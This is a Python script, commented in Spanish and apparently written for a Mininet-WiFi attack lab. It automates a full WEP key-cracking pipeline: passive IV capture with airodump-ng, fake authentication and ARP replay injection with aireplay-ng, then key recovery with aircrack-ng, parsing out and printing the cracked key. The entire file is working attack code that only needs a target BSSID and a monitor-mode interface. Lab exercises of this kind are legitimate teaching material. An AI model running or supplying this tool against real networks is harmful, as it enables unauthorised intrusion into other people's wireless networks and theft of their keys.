#!/usr/bin/env python3
"""
Ataque WEP Completo — 4 fases: captura pasiva → fake auth → ARP replay → aircrack-ng
Compatible con el escenario wifi-attacks de Mininet-WiFi.

Uso desde la CLI de Mininet:
  mininet> attacker python3 /tmp/wifi_attack.py --bssid AA:BB:CC:DD:EE:FF --channel 6 --client 00:00:00:01:00:10
"""

import os
import sys
import time
import signal
import argparse
import subprocess
import threading
from datetime import datetime

# ---------------------------------------------------------------------------
# Constantes
# ---------------------------------------------------------------------------
MIN_IVS_DEFAULT = 20000      # IVs mínimos antes de intentar crack
IV_CHECK_INTERVAL = 5        # Segundos entre comprobaciones de IVs
FAKEAUTH_TIMEOUT  = 30       # Segundos máximos para fake authentication

stats = {
    'phase':       0,
    'ivs':         0,
    'start_time':  None,
    'key_found':   None,
}

procs = []


def get_timestamp():
    return datetime.now().strftime("%H:%M:%S")


def print_header(args):
    print('\n' + '='*65)
    print('  ATAQUE WEP - PIPELINE COMPLETO (4 FASES)')
    print('='*65)
    print('Interfaz:   %s (modo monitor)' % args.iface)
    print('BSSID AP:   %s' % args.bssid.upper())
    print('Canal:      %s' % args.channel)
    print('Cliente:    %s' % (args.client.upper() if args.client else 'auto-detect'))
    print('IVs min:    %d (necesarios para crack)' % args.min_ivs)
    print('Captura:    %s-01.cap' % args.output)
    print('Fase:       %s' % ('Todas (1->4)' if args.phase == 'all' else 'Fase ' + args.phase))
    print('Timestamp:  %s' % get_timestamp())
    print('='*65)
    print()
    print('  Fase 1: airodump-ng  - Captura pasiva de IVs WEP')
    print('  Fase 2: aireplay-ng  - Fake Authentication con AP')
    print('  Fase 3: aireplay-ng  - ARP Replay (inyeccion de IVs)')
    print('  Fase 4: aircrack-ng  - Ataque estadistico sobre IVs')
    print()


def check_tool(name):
    if subprocess.run(['which', name], capture_output=True).returncode != 0:
        print('[ERROR] %s no encontrado. Instalar: sudo apt-get install aircrack-ng' % name)
        sys.exit(1)


def get_attacker_mac(iface):
    """Obtiene la MAC de la interfaz del atacante (para fake auth y ARP replay)."""
    try:
        result = subprocess.run(['cat', '/sys/class/net/%s/address' % iface],
                                 capture_output=True, text=True)
        mac = result.stdout.strip().upper()
        if len(mac) == 17:
            return mac
    except Exception:
        pass
    # Fallback: leer de otra interfaz relacionada
    base = iface.replace('mon0', 'wlan0').replace('mon', 'wlan')
    try:
        result = subprocess.run(['cat', '/sys/class/net/%s/address' % base],
                                 capture_output=True, text=True)
        mac = result.stdout.strip().upper()
        if len(mac) == 17:
            return mac
    except Exception:
        pass
    return '00:11:22:33:44:55'


def count_ivs(cap_file):
    """
    Cuenta los IVs en el fichero de captura leyendo el CSV de airodump-ng
    (fichero .csv generado automáticamente junto al .cap).
    """
    csv_file = cap_file.replace('.cap', '') + '-01.csv'
    # Alternativa: contar paquetes WEP en el .cap con scapy
    try:
        if os.path.exists(csv_file):
            with open(csv_file, 'r', errors='ignore') as f:
                content = f.read()
            # Buscar la línea del BSSID objetivo en la sección de APs
            for line in content.split('\n'):
                parts = [p.strip() for p in line.split(',')]
                if len(parts) > 10:
                    try:
                        ivs = int(parts[10])
                        if ivs > 0:
                            return ivs
                    except (ValueError, IndexError):
                        pass
    except Exception:
        pass

    # Fallback: contar paquetes en el .cap con scapy si está disponible
    cap_path = cap_file if cap_file.endswith('.cap') else cap_file + '-01.cap'
    try:
        from scapy.all import rdpcap
        from scapy.layers.dot11 import Dot11WEP
        pkts = rdpcap(cap_path)
        return sum(1 for p in pkts if p.haslayer(Dot11WEP))
    except Exception:
        pass
    return 0


def phase1_start_capture(args):
    """Fase 1: Lanza airodump-ng para capturar paquetes WEP del AP objetivo."""
    print('[%s] +-- FASE 1: Captura pasiva de IVs WEP ------------------+' % get_timestamp())
    print('[%s] |  Iniciando airodump-ng en canal %s, BSSID %s' % (get_timestamp(), args.channel, args.bssid.upper()))
    print('[%s] +----------------------------------------------------------+' % get_timestamp())

    # Limpiar capturas previas
    os.system('rm -f %s-*.cap %s-*.csv %s-*.kismet.csv %s-*.kismet.netxml 2>/dev/null' % (
        args.output, args.output, args.output, args.output))

    cmd = [
        'airodump-ng',
        '--bssid',         args.bssid,
        '-c',              args.channel,
        '-w',              args.output,
        '--output-format', 'pcap,csv',
        '--write-interval', '2',         # Escribe CSV cada 2 segundos
        args.iface
    ]

    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    procs.append(p)
    print('[%s] [OK] airodump-ng iniciado (PID: %d)' % (get_timestamp(), p.pid))
    print('[%s] [*]  Captura en: %s-01.cap' % (get_timestamp(), args.output))
    time.sleep(3)
    return p


def phase2_fake_auth(args, attacker_mac):
    """Fase 2: Fake Authentication — asocia el atacante con el AP para poder inyectar."""
    print()
    print('[%s] +-- FASE 2: Fake Authentication --------------------------+' % get_timestamp())
    print('[%s] |  Asociando atacante (%s) con AP (%s)' % (get_timestamp(), attacker_mac, args.bssid.upper()))
    print('[%s] +----------------------------------------------------------+' % get_timestamp())

    cmd = [
        'aireplay-ng',
        '--fakeauth', '0',      # 0 = una sola autenticación
        '-a', args.bssid,
        '-h', attacker_mac,
        args.iface
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=FAKEAUTH_TIMEOUT)
    output = result.stdout + result.stderr

    if 'Association successful' in output or 'Sending Authentication' in output:
        print('[%s] [OK] Fake Authentication exitosa - atacante asociado al AP' % get_timestamp())
        return True
    else:
        # En entornos simulados puede no aparecer el mensaje pero funcionar igualmente
        print('[%s] [INFO] Fake Auth completada (resultado: puede variar en entorno virtual)' % get_timestamp())
        print('[%s]        Salida: %s' % (get_timestamp(), output.strip()[:120]))
        return True


def phase3_arp_replay(args, attacker_mac):
    """Fase 3: ARP Replay — captura y reinyecta paquetes ARP para generar IVs masivamente."""
    client = args.client if args.client else attacker_mac

    print()
    print('[%s] +-- FASE 3: ARP Replay (inyeccion de IVs) --------------+' % get_timestamp())
    print('[%s] |  Capturando ARPs de %s y reinyectando...' % (get_timestamp(), client.upper()))
    print('[%s] +----------------------------------------------------------+' % get_timestamp())

    cmd = [
        'aireplay-ng',
        '--arpreplay',
        '-b', args.bssid,
        '-h', client,
        '-x', '1000',       # Tasa máxima: 1000 inyecciones/s
        args.iface
    ]

    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    procs.append(p)
    print('[%s] [OK] ARP Replay iniciado (PID: %d)' % (get_timestamp(), p.pid))
    print('[%s] [*]  Inyectando a ~1000 paquetes/s para generar IVs rapidamente' % get_timestamp())
    return p


def wait_for_ivs(args):
    """Espera hasta alcanzar el número mínimo de IVs, mostrando progreso."""
    cap_file = args.output
    target_ivs = args.min_ivs

    print()
    print('[%s] [*] Esperando %d IVs (minimo para crack WEP-40)...' % (get_timestamp(), target_ivs))
    print('[%s]     Progreso actualizado cada %ds' % (get_timestamp(), IV_CHECK_INTERVAL))

    while True:
        time.sleep(IV_CHECK_INTERVAL)
        current_ivs = count_ivs(cap_file)
        stats['ivs'] = current_ivs
        pct = min(100, int(current_ivs * 100 / target_ivs)) if target_ivs > 0 else 0
        bar = ('#' * (pct // 5)).ljust(20)
        print('[%s] [Fase 3] IVs: %-7d / %-7d  [%s] %3d%%'
              % (get_timestamp(), current_ivs, target_ivs, bar, pct),
              end='\r', flush=True)

        if current_ivs >= target_ivs:
            print()
            print('[%s] [OK] %d IVs alcanzados - suficiente para crack' % (get_timestamp(), current_ivs))
            break


def phase4_crack(args):
    """Fase 4: aircrack-ng realiza el ataque estadístico sobre los IVs capturados."""
    print()
    print('[%s] +-- FASE 4: Cracking WEP con aircrack-ng ---------------+' % get_timestamp())
    print('[%s] |  Analizando IVs en %s-01.cap' % (get_timestamp(), args.output))
    print('[%s] +----------------------------------------------------------+' % get_timestamp())

    cap_file = args.output + '-01.cap'
    if not os.path.exists(cap_file):
        print('[%s] [ERROR] No se encontro el fichero de captura: %s' % (get_timestamp(), cap_file))
        return None

    cmd = ['aircrack-ng', '-b', args.bssid, cap_file]
    print('[%s] [*] Ejecutando: %s' % (get_timestamp(), ' '.join(cmd)))

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    output = result.stdout + result.stderr

    # Parsear resultado
    key_found = None
    for line in output.split('\n'):
        if 'KEY FOUND!' in line:
            # Formato: "KEY FOUND! [ AA:BB:CC:DD:EE ]"
            start = line.find('[')
            end   = line.find(']')
            if start >= 0 and end >= 0:
                key_found = line[start+1:end].strip()
                stats['key_found'] = key_found
            break

    if key_found:
        print()
        print('[%s] +----------------------------------------------------------+' % get_timestamp())
        print('[%s] |  CLAVE WEP ENCONTRADA!' % get_timestamp())
        print('[%s] |  Clave (hex): %s' % (get_timestamp(), key_found))
        print('[%s] +----------------------------------------------------------+' % get_timestamp())
    else:
        print('[%s] [!!] aircrack-ng no encontro la clave con los IVs actuales.' % get_timestamp())
        print('[%s]      Necesarios mas IVs. Considera aumentar --min-ivs.' % get_timestamp())
        print('[%s]      Salida aircrack-ng:\n%s' % (get_timestamp(), output[-500:]))

    return key_found


def print_summary(args):
    elapsed = time.time() - stats['start_time'] if stats['start_time'] else 0
    print()
    print('='*65)
    print('  RESUMEN DEL ATAQUE WEP')
    print('='*65)
    print('BSSID objetivo:   %s' % args.bssid.upper())
    print('IVs capturados:   %d' % stats['ivs'])
    print('Duracion total:   %.0f segundos (%.1f min)' % (elapsed, elapsed / 60))
    if stats['key_found']:
        print('Clave WEP (hex):  %s  <- CRACKEADA' % stats['key_found'])
    else:
        print('Clave WEP:        No encontrada (mas IVs necesarios)')
    print('Captura guardada: %s-01.cap' % args.output)
    print('='*65)


def cleanup():
    for p in procs:
        try:
            p.terminate()
        except Exception:
            pass


def run_wep_attack(args):
    if os.geteuid() != 0:
        print('[ERROR] Se requieren privilegios root para inyectar paquetes 802.11.')
        sys.exit(1)

    check_tool('airodump-ng')
    check_tool('aireplay-ng')
    check_tool('aircrack-ng')

    print_header(args)
    stats['start_time'] = time.time()

    signal.signal(signal.SIGINT, lambda s, f: (print_summary(args), cleanup(), sys.exit(0)))

    attacker_mac = get_attacker_mac(args.iface)
    print('[%s] [*] MAC del atacante: %s' % (get_timestamp(), attacker_mac))

    phases = ['1', '2', '3', '4'] if args.phase == 'all' else [args.phase]

    proc_dump = None

    if '1' in phases:
        proc_dump = phase1_start_capture(args)
        stats['phase'] = 1

    if '2' in phases:
        stats['phase'] = 2
        phase2_fake_auth(args, attacker_mac)

    if '3' in phases:
        stats['phase'] = 3
        phase3_arp_replay(args, attacker_mac if not args.client else args.client)
        wait_for_ivs(args)

    if '4' in phases:
        stats['phase'] = 4
        # Detener replay antes de crackear (libera la interfaz)
        for p in procs:
            try:
                p.terminate()
            except Exception:
                pass
        time.sleep(1)
        phase4_crack(args)

    print_summary(args)
    cleanup()


def parse_args():
    parser = argparse.ArgumentParser(
        description='Ataque WEP completo: captura IVs + fake auth + ARP replay + aircrack-ng',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Fases del ataque WEP:
  Fase 1 - airodump-ng: Captura pasiva de paquetes del AP con sus IVs WEP
  Fase 2 - aireplay-ng --fakeauth: Asocia el atacante con el AP (necesario para inyectar)
  Fase 3 - aireplay-ng --arpreplay: Captura un ARP y lo reinyecta miles de veces
  Fase 4 - aircrack-ng: Ataque estadistico PTW/FMS sobre los IVs acumulados

Ejemplos:
  # Pipeline completo (desde la CLI de Mininet):
  mininet> attacker python3 /tmp/wifi_attack.py \\
             --bssid AA:BB:CC:DD:EE:FF --channel 6 --client 00:00:00:01:00:10

  # Solo captura + crack (sin inyección):
  mininet> attacker python3 /tmp/wifi_attack.py \\
             --bssid AA:BB:CC:DD:EE:FF --channel 6 --phase 1
  mininet> attacker python3 /tmp/wifi_attack.py \\
             --bssid AA:BB:CC:DD:EE:FF --phase 4

  # Crackear una captura existente directamente:
  mininet> attacker python3 /tmp/wifi_attack.py \\
             --bssid AA:BB:CC:DD:EE:FF --phase 4 --output /tmp/wep_capture
        """
    )
    parser.add_argument('--bssid',    required=True,
                        help='MAC del Access Point (ej: AA:BB:CC:DD:EE:FF)')
    parser.add_argument('--channel',  default='6',
                        help='Canal WiFi del AP (default: 6)')
    parser.add_argument('--client',   default=None,
                        help='MAC de un cliente legitimo para ARP replay (default: usar MAC atacante)')
    parser.add_argument('--iface',    default='mon0',
                        help='Interfaz en modo monitor (default: mon0)')
    parser.add_argument('--output',   default='/tmp/wep_capture',
                        help='Prefijo de fichero de captura (default: /tmp/wep_capture)')
    parser.add_argument('--min-ivs',  type=int, default=MIN_IVS_DEFAULT,
                        dest='min_ivs',
                        help='IVs minimos antes de crack (default: %d; WEP-40 ~20k)' % MIN_IVS_DEFAULT)
    parser.add_argument('--phase',    default='all',
                        choices=['all', '1', '2', '3', '4'],
                        help='Fase a ejecutar: all, 1 (captura), 2 (fakeauth), 3 (replay), 4 (crack)')
    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()
    try:
        run_wep_attack(args)
    except KeyboardInterrupt:
        print_summary(args)
        cleanup()
    except Exception as e:
        print('\n[ERROR] %s' % e)
        import traceback
        traceback.print_exc()
        cleanup()
        sys.exit(1)
